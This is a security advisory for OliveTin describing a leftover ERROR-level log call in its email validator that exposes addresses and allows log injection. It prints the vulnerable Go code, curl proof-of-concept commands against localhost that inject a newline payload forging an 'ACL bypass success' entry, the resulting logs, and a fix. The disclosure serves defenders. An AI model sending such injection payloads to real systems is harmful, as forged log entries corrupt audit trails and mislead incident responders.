# [M] OliveTin's email argument makes compliance harder, enables log injection

## Summary
Severity: Medium
Advisory: GHSA-xx6g-43w2-9g6g
CWE: CWE-117, CWE-532
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-03-12
Source: https://github.com/advisories/GHSA-xx6g-43w2-9g6g
Type: github-advisory

## Affected
- Go: `github.com/OliveTin/OliveTin` — affected >=0 <3000.11.3

## Details
### Summary
The typeSafetyCheckEmail() function in service/internal/executor/arguments.go calls log.Errorf() on every invocation including when validation succeeds (err == nil). This means every email address submitted by any user is written to the application's ERROR-level log unconditionally. Because the raw user-supplied value is logged without sanitization, an attacker can inject newline characters to forge arbitrary structured log entries (log injection). In deployments using centralized logging (ELK, Splunk, Grafana), the injected lines are parsed as real events, enabling fake security alerts, audit trail manipulation, and persistent misdirection of incident response.

### Details
File: service/internal/executor/arguments.go Line: 254
Version confirmed: 3000.11.1

### Vulnerable code

```go
func typeSafetyCheckEmail(value string) error {
    _, err := mail.ParseAddress(value)
    log.Errorf("Email check: %v, %v", err, value) 
    if err != nil {
        return err
    }
    return nil
}
```

The log.Errorf call was likely introduced as a debug statement during development and was never removed before release. It has three distinct security consequences:

1. PII Exposure via ERROR logs

Every email address (valid or invalid) submitted to any action with type: email is written to the ERROR log. In production deployments, ERROR logs are typically forwarded to centralized systems (Splunk, ELK, Datadog) and retained long-term. Email addresses constitute PII under 

3. Log Injection

The %v format verb renders the raw value string without escaping newlines or control characters. An attacker who can reach any action with a type: email argument can send:

`alice@example.com\nlevel="error" msg="ACL bypass success" username="admin"`

OliveTin writes two lines to the log. Structured log parsers (logfmt, JSON) treat the second line as an independent real event. This enables:

- Forged security alerts that trigger real PagerDuty/Opsgenie pages
- Audit trail manipulation hiding real events among noise
- False positives that exhaust on-call responder attention (alert fatigue)

4. Alert Fatigue

Because even successful validations emit ERROR-level entries, any production deployment with email-type actions generates continuous spurious error alerts. Monitoring systems configured to alert on level=error will fire on every normal form submission.

Affected execution:
mode: exec: only 
The shell: execution mode blocks email type arguments via checkShellArgumentSafety() before typeSafetyCheckEmail() is ever reached. The vulnerability is only reachable when the action uses exec: mode which is the recommended and documented mode for email-type arguments (OliveTin explicitly instructs users to use exec: with email type).

## PoC

### Get the binding ID

```bash
BINDING=$(curl -s -X POST http://localhost:1337/api/GetDashboard \
  -H "Content-Type: application/json" -d '{}' | \
  python3 -c "
import sys,json
d=json.load(sys.stdin)
def f(o):
    if isinstance(o,dict):
        a=o.get('action')
        if a and isinstance(a,dict):
            for arg in a.get('arguments',[]):
                if arg.get('type')=='email': print(a['bindingId'])
        [f(v) for v in o.values()]
    elif isinstance(o,list): [f(i) for i in o]
f(d)")
echo "Binding: $BINDING"
```

### Trigger PII exposure (valid email --> ERROR log):

```bash
curl -s -X POST http://localhost:1337/api/StartAction \
  -H "Content-Type: application/json" \
  -d "{\"bindingId\":\"$BINDING\",\"arguments\":[{\"name\":\"recipient\",\"value\":\"alice@example.com\"}]}"
```

### Observed server log (confirmed on 3000.11.1):

```bash
docker logs olivetin-test 2>&1 | grep -E "Email check|ACL_bypass" | tail -5
level="error" msg="Email check: <nil>, alice@example.com"
level="error" msg="Email check: mail: expected single address, got \"\\nlevel=\\\"error\\\" msg=\\\"ACL bypass success\\\" username=\\\"admin\\\"\", a@b.com\nlevel=\"error\" msg=\"ACL bypass success\" username=\"admin\""
level="error" msg="Email check: mail: expected single address, got \"\\nlevel=error msg=ACL_bypass username=admin\", a@b.com\nlevel=error msg=ACL_bypass username=admin"
level="warning" msg="mail: expected single address, got \"\\nlevel=error msg=ACL_bypass username=admin\""
level="error" msg="Email check: <nil>, alice@example.com"
```

### Trigger log injection:

```bash
curl -s -X POST http://localhost:1337/api/StartAction \
  -H "Content-Type: application/json" \
  -d "{\"bindingId\":\"$BINDING\",\"arguments\":[{\"name\":\"recipient\",\"value\":\"a@b.com\nlevel=\\\"error\\\" msg=\\\"ACL bypass success\\\" username=\\\"admin\\\"\"}]}"
```

### Observed server log injected line appears as a real event:

```bash
docker logs olivetin-test 2>&1 | grep -E "Email check|ACL_bypass" | tail -5
level="error" msg="Email check: mail: expected single address, got \"\\nlevel=\\\"error\\\" msg=\\\"ACL bypass success\\\" username=\\\"admin\\\"\", a@b.com\nlevel=\"error\" msg=\"ACL bypass success\" username=\"admin\""
level="error" msg="Email check: mail: expected single address, got \"\\nlevel=error msg=ACL_bypass username=admin\", a@b.com\nlevel=error msg=ACL_bypass username=admin"
level="warning" msg="mail: expected single address, got \"\\nlevel=error msg=ACL_bypass username=admin\""
level="error" msg="Email check: <nil>, alice@example.com"
level="error" msg="Email check: mail: expected single address, got \"\\nlevel=\\\"error\\\" msg=\\\"ACL bypass success\\\" username=\\\"admin\\\"\", a@b.com\nlevel=\"error\" msg=\"ACL bypass success\" username=\"admin\""
```

### Impact
- End users whose email addresses are stored in ERROR logs without consent GDPR/CCPA violation risk for operators
- Security operations teams whose SIEM/log aggregation systems can be fed forged events by any user who can submit email-type action arguments
- On-call engineers subjected to continuous false positive ERROR alerts from valid form submissions
- Operators who use type: email for informal token/API key validation those secrets appear in ERROR logs

### Recommendation

```go
func typeSafetyCheckEmail(value string) error {
    _, err := mail.ParseAddress(value)
    if err != nil {
        log.WithField("type", "email").Debugf("Email argument type check failed")
        return err
    }
    return nil
}
```

`Only log on failure, at DEBUG level, and never log the value itself.`

## References
- https://github.com/OliveTin/OliveTin/security/advisories/GHSA-xx6g-43w2-9g6g
- https://github.com/OliveTin/OliveTin/commit/bc5e9fbe1e22ff87a4b277cb56605a46a10e561a
- https://github.com/OliveTin/OliveTin
- https://github.com/OliveTin/OliveTin/releases/tag/3000.11.3
